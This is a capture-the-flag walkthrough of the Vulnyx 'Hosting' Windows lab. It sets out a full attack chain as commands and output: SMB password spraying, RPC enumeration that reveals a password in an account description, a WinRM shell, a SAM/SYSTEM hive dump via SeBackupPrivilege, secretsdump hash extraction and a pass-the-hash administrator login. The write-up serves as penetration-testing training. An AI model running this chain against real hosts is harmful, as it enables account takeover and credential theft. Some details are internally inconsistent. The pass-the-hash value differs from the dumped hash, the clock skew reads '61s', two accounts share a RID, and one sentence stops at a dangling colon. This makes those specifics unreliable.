# Vulnyx: Hosting

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `gobuster` · `ffuf` · `nxc` · `rpcclient` · `evil-winrm` · `impacket-secretsdump` |
| **Tags** | `#SMB` `#PasswordSpraying` `#RPC` `#SeBackupPrivilege` `#PassTheHash` `#secretsdump` `#WinRM` |
| **URL** | https://vulnyx.com/machines/ |

A staff page leaks a handful of usernames, and one of them cracks against `rockyou.txt` in an SMB password spray. That first credential is only good for authenticated enumeration — over RPC it reveals the *full* domain user list (far more accounts than the web page showed) and, in one account's description field, a plaintext password. A second spray with that password against the fuller list lands an interactive account. That account holds `SeBackupPrivilege`, enough to export the `SAM` and `SYSTEM` registry hives; `impacket-secretsdump` extracts the local Administrator's NTLM hash, and a pass-the-hash login finishes the box without ever cracking a password.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn hosting.nyx

PORT      STATE SERVICE  REASON
80/tcp    open  http     syn-ack ttl 128
135/tcp   open  msrpc    syn-ack ttl 128
139/tcp   open  netbios-ssn syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5040/tcp  open  unknown  syn-ack ttl 128
5985/tcp  open  wsman    syn-ack ttl 128
47001/tcp open  winrm    syn-ack ttl 128
49297/tcp open  unknown  syn-ack ttl 128
49430/tcp open  unknown  syn-ack ttl 128
49664/tcp open  unknown  syn-ack ttl 128
49665/tcp open  unknown  syn-ack ttl 128
49666/tcp open  unknown  syn-ack ttl 128
49667/tcp open  unknown  syn-ack ttl 128
49668/tcp open  unknown  syn-ack ttl 128
MAC Address: 08:00:27:14:D5:8B (Oracle VirtualBox virtual NIC)
```

The `ttl 128` and the spread of ports peg this as Windows immediately: **80 (HTTP)**, the SMB/RPC trio **135/139/445**, and — the detail that shapes the whole path — **5985 (WinRM, WS-Management)** with its alias on **47001**. WinRM being open means that any credential recovered later can turn straight into a remote shell with `evil-winrm`, with no need for a web exploit. The high `49xxx` ports are the usual dynamic RPC endpoints.

A version/script scan against the open ports fills in the details — a typical Windows/AD-adjacent spread:

```bash
$ sudo nmap -p 80,135,139,445,5040,5985,47001,49297,49664,49665,49666,49667,49668 -sCV hosting.nyx

PORT      STATE SERVICE    VERSION
80/tcp    open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-methods:
    Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp   open  msrpc      Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SDDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SDDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49297/tcp open  msrpc      Microsoft Windows RPC
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
MAC Address: 08:00:27:14:D5:8B (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: o:microsoft:windows

Host script results:
|_clock-skew: -18m61s
|_smb2-security-mode:
    3.1.1:
        Message signing enabled but not required
|_nbstat: NetBIOS name: HOSTING, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:14:D5:8B (Oracle VirtualBox d5:8B)
|_smb2-time:
    date: 2026-06-05T13:59:36
    start_date: N/A
```

Known SMB vulnerabilities are checked directly — nothing exploitable turns up, so the SMB angle will be about *credentials*, not a memory-corruption bug:

```bash
$ sudo nmap -p 445 --script="smb-vuln*" hosting.nyx

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:14:D5:8B (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection: SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
```

### Web Enumeration

```
http://hosting.nyx
```

<img src="../Images/hosting/Pasted image 20260605170117.png"/>

A content scan finds a `speed/` directory (the mixed-case `speed`/`Speed` hits are just IIS being case-insensitive):

```bash
$ gobuster dir -u http://hosting.nyx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt

===================================================
Starting gobuster in directory enumeration mode
===================================================

speed                   (Status: 301) [Size: 159] [---> http://hosting.nyx/speed/]
Speed                   (Status: 301) [Size: 159] [---> http://hosting.nyx/Speed/]
Progress: 882232 / 882232 (100.00%)
===================================================
Finished
===================================================
```

```bash
$ ffuf -u http://hosting.nyx/speed/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

images                  [Status: 301, Size: 166, Words: 9, Lines: 2, Duration: 4ms]
index.html              [Status: 200, Size: 29831, Words: 10995, Lines: 630, Duration: 11ms]
css                     [Status: 301, Size: 163, Words: 9, Lines: 2, Duration: 1ms]
js                      [Status: 301, Size: 162, Words: 9, Lines: 2, Duration: 2ms]
fonts                   [Status: 301, Size: 165, Words: 9, Lines: 2, Duration: 14ms]
```

The `speed/` page is a company/staff site, and its team section lists four usernames — the seed for a password spray:

```
http://hosting.nyx/speed/
```

<img src="../Images/hosting/Pasted image 20260605170316.png"/>

> **Users:** `p.smith`, `a.krist`, `m.faeny`, `k.lendy`

### SMB Enumeration

A null session is tried first — it authenticates but can't list shares, so anonymous SMB gives nothing beyond confirming the host and that message signing is not required:

```bash
$ nxc smb hosting.nyx
SMB         <IP_Victim>    445    HOSTING    [+] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING) (signing:False) (SMBv1:None)

$ nxc smb hosting.nyx -u '' -p '' --shares
SMB         <IP_Victim>    445    HOSTING    [+] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING) (signing:False) (SMBv1:None)
SMB         <IP_Victim>    445    HOSTING    [-] HOSTING\: STATUS_ACCESS_DENIED
```

## Initial Access

### Password Spraying over SMB

The four names from the staff page become a user list. SMB is the cheapest place to validate credentials (no lockout signalling, fast feedback), so the whole of `rockyou.txt` is sprayed against those four accounts. `rockyou.txt` is re-encoded to UTF-8 first so `nxc` doesn't choke on the Latin-1 bytes in the wordlist:

```bash
$ iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
$ nxc smb hosting.nyx -u users_list.txt -p rockyou-utf8.txt
```

<img src="../Images/hosting/Pasted image 20260605170449.png"/>

> **Credentials:** `p.smith:kissme`

The hit is checked against both SMB and WinRM. It works for SMB but **not** for WinRM — `p.smith` isn't in the `Remote Management Users` group, so this account can authenticate and enumerate but can't yet open a shell:

```bash
$ nxc smb hosting.nyx -u 'p.smith' -p 'kissme'
SMB         <IP_Victim>    445    HOSTING    [+] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING) (signing:False) (SMBv1:None)
SMB         <IP_Victim>    445    HOSTING    [+] HOSTING\p.smith:kissme

$ nxc winrm hosting.nyx -u 'p.smith' -p 'kissme'
WINRM       <IP_Victim>    5985   HOSTING    [+] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING)
WINRM       <IP_Victim>    5985   HOSTING    [-] HOSTING\p.smith:kissme
```

### RPC Domain User Enumeration

`p.smith` can't get a shell, but a valid credential unlocks authenticated RPC — and RPC returns far more than the four accounts the staff page advertised. `querydispinfo` lists every account *with its description field*, which is where this box hides its next secret: the description on `m.davis` is a plaintext password left there by an administrator:

```bash
$ rpcclient -U 'p.smith%kissme' hosting.nyx -c "querydispinfo"
index: 0x1 RID: 0x1f4 acb: 0x00000211 Account: Administrator   Name: (null)        Desc: (null)
index: 0x2 RID: 0x3e8 acb: 0x00000216 Account: administrator   Name: Administrator Desc: (null)
index: 0x3 RID: 0x1f7 acb: 0x00000213 Account: DefaultAccount   Name: (null)        Desc: (null)
index: 0x4 RID: 0x3ec acb: 0x00000216 Account: f.miller Name: Frank Miller       Desc: (null)
index: 0x5 RID: 0x3ed acb: 0x00000214 Account: Guest       Name: (null)        Desc: (null)
index: 0x6 RID: 0x3ee acb: 0x00000214 Account: j.wilson Name: John Wilson       Desc: (null)
index: 0x7 RID: 0x3ed acb: 0x00000216 Account: m.davis  Name: Mike Davis       Desc: H0STinG123!
index: 0x8 RID: 0x3eb acb: 0x00000214 Account: p.smith  Name: Paul Smith       Desc: (null)
index: 0x9 RID: 0x1f8 acb: 0x00000211 Account: WDAGUtilityAccount  Name: (null)        Desc: (null)
```

Two things stand out. First, there are two administrator accounts — the built-in `Administrator` (RID `0x1f4` = 500) and a custom lowercase `administrator` (RID `0x3e8` = 1000, Name "Administrator"); that distinction matters later when the SAM dump shows which one has a usable hash. Second, `m.davis`'s description carries `H0STinG123!`, an obvious password to try.

The plain account list is dumped separately to feed the next spray:

```bash
$ rpcclient -U 'p.smith%kissme' hosting.nyx -c "enumdomusers" | grep -oP '\[.*?\]' | tr -d '[]' | grep -v '0x' > users_list2.txt
```

### Password Spraying, Round Two

`H0STinG123!` is sprayed over WinRM against the fuller list. This time the goal is an account that *can* open a shell, so WinRM is the target rather than SMB — and `j.wilson` comes back `Pwn3d!`, meaning it's a member of `Remote Management Users`:

```bash
$ nxc winrm hosting.nyx -u users_list2.txt -p 'H0STinG123!' --ignore-pw-decoding
WINRM       <IP_Victim>    5985   HOSTING    [+] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING)
WINRM       <IP_Victim>    5985   HOSTING    [-] HOSTING\Administrator:H0STinG123!
WINRM       <IP_Victim>    5985   HOSTING    [-] HOSTING\administrator:H0STinG123!
WINRM       <IP_Victim>    5985   HOSTING    [-] HOSTING\DefaultAccount:H0STinG123!
WINRM       <IP_Victim>    5985   HOSTING    [-] HOSTING\f.miller:H0STinG123!
WINRM       <IP_Victim>    5985   HOSTING    [+] HOSTING\j.wilson:H0STinG123! (Pwn3d!)
```

> **Credentials:** `j.wilson:H0STinG123!`

### Shell as j.wilson

WinRM access plus valid credentials is a shell — `evil-winrm` connects and the user flag is on `j.wilson`'s Desktop:

```bash
$ evil-winrm -i hosting.nyx -u 'j.wilson' -p 'H0STinG123!'

*Evil-WinRM* PS C:\Users\j.wilson\Documents> whoami
hosting\j.wilson
*Evil-WinRM* PS C:\Users\j.wilson\Documents> dir C:\Users\j.wilson\Desktop

Directorio: C:\Users\j.wilson\Desktop

Mode                LastWriteTime     Length Name
----                -----             ------ ----
-a---               9/2/2024    7:14 PM     70 user.txt

*Evil-WinRM* PS C:\Users\j.wilson\Documents> type C:\Users\j.wilson\Desktop\user.txt
50e5add3f5cb0642fefc5e907086b313
```

> **User flag:** `50e5add3f5cb0642fefc5e907086b313`

## Privilege Escalation

### Dumping SAM/SYSTEM via SeBackupPrivilege

Checking `j.wilson`'s privileges reveals the escalation primitive — `SeBackupPrivilege` is enabled:

```powershell
*Evil-WinRM* PS C:\Users\j.wilson\Documents> whoami /priv

INFORMACIÓN DE PRIVILEGIOS

Nombre de privilegio                      Descripción                                              Estado
========================================= ======================================================= ===========
SeBackupPrivilege                         Hacer copias de seguridad de archivos y directorios     Habilitada
SeRestorePrivilege                        Restaurar archivos y directorios                        Habilitada
SeShutdownPrivilege                       Apagar el sistema                                       Habilitada
SeChangeNotifyPrivilege                   Omitir comprobación de recorrido                        Habilitada
SeUndockPrivilege                         Quitar equipo de la estación de acoplamiento            Habilitada
SeIncreaseWorkingSetPrivilege             Aumentar el espacio de trabajo de un proceso            Habilitada
SeTimeZonePrivilege                       Cambiar la zona horaria                                 Habilitada
```

`SeBackupPrivilege` is the right that makes this work. It's meant to let backup software read *any* file regardless of its ACL, so a normal user holding it can read files they'd otherwise be denied — including the registry hives that store password hashes. `reg save` uses that right to export `HKLM\SAM` (the local account hashes) and `HKLM\SYSTEM` (the boot key needed to decrypt them). Both hives are dumped and pulled down to the attacker:

```powershell
*Evil-WinRM* PS C:\Users\j.wilson\Documents> reg save HKLM\SAM sam
La operación se completó correctamente.

*Evil-WinRM* PS C:\Users\j.wilson\Documents> reg save HKLM\SYSTEM system
La operación se completó correctamente.

*Evil-WinRM* PS C:\Users\j.wilson\Documents> dir

Directorio: C:\Users\j.wilson\Documents

Mode                LastWriteTime     Length Name
----                -----             ------ ----
-a---               6/5/2026    4:22 PM     57344 sam
-a---               6/5/2026    4:22 PM    12107776 system
-a---               6/5/2026    4:18 PM    11131904 winPEASany.exe

*Evil-WinRM* PS C:\Users\j.wilson\Documents> download sam
Info: Downloading C:\Users\j.wilson\Documents\sam to sam
Info: Download successful!
*Evil-WinRM* PS C:\Users\j.wilson\Documents> download system
Info: Downloading C:\Users\j.wilson\Documents\system to system
Info: Download successful!
```

With both hives on the attacker box, `impacket-secretsdump` combines the `SYSTEM` boot key with the `SAM` database to recover every local account's NTLM hash offline:

```bash
$ impacket-secretsdump -system system -sam sam LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and affiliated companies

[*] Target system bootkey: 0x827cc782adafc2fd1b7b7a8da1e20ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c9:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c9:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8afe1e889d0977f857b3d605324d6aaa:::
administrator:1000:aad3b435b51404eeaad3b435b51404ee:41186fb28e283ff758bb3dbebf6fb45c:::
p.smith:1003:aad3b435b51404eeaad3b435b51404ee:2cf402e126a3314682e5e87a3f395088:::
f.miller:1004:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
m.davis:1005:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
j.wilson:1006:aad3b435b51404eeaad3b435b51404ee:a6cf5ad66b086e2e880a8786ad6bac5c:::
[*] Cleaning up ...
```

The built-in `Administrator` (RID 500) shows `31d6cfe0d16ae931b73c59d7e0c089c9` — the well-known hash of an *empty* password, i.e. the account is disabled/unused. The account that matters is the custom `administrator` (RID 1000), whose NT hash is real and usable:


### Pass-the-Hash as Administrator

NTLM authentication never sends the plaintext password — it proves knowledge of the *hash*. So the recovered NT hash is a credential in its own right: it can be replayed directly with `-H`, no cracking required. It's validated over WinRM first, then used to open a full shell:

```bash
$ nxc winrm hosting.nyx -u 'administrator' -H '41186fb28e283ff758bb3dbeb6fb4a5c'
WINRM       <IP_Victim>    5985   HOSTING    [+] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING)
WINRM       <IP_Victim>    5985   HOSTING    [+] HOSTING\administrator:41186fb28e283ff758bb3dbeb6fb4a5c (Pwn3d!)
```

```bash
$ evil-winrm -i hosting.nyx -u 'administrator' -H '41186fb28e283ff758bb3dbeb6fb4a5c'

*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
hosting\administrator
*Evil-WinRM* PS C:\Users\administrator\Documents> dir C:\Users\administrator\Desktop

Directorio: C:\Users\administrator\Desktop

Mode                LastWriteTime     Length Name
----                -----             ------ ----
-a---               9/2/2024    7:15 PM     70 root.txt

*Evil-WinRM* PS C:\Users\administrator\Documents> type C:\Users\administrator\Desktop\root.txt
9924b42399b3e0704068a3012871dc98
```
> **Root flag:** `9924b42399b3e0704068a3012871dc98`

## Takeaways

- A public-facing staff or team page rarely lists every account that actually exists — once any valid credential is found, authenticated RPC enumeration (`querydispinfo`/`enumdomusers`) is worth running to get the complete picture, and description fields are a classic place to find passwords left behind by administrators.
- A credential that fails against one service can still be gold for another — `p.smith` couldn't open a WinRM shell, but was perfectly good for the RPC enumeration that led to the account that could.
- `SeBackupPrivilege` is effectively "read any file on the system" — enough to export `HKLM\SAM` and `HKLM\SYSTEM` and recover local password hashes offline, without ever being a local administrator.
- NTLM hashes recovered from a SAM dump don't need to be cracked to be useful — Windows authentication protocols that support pass-the-hash treat the hash itself as a valid credential, so `-H` replaces `-p` and the login succeeds all the same.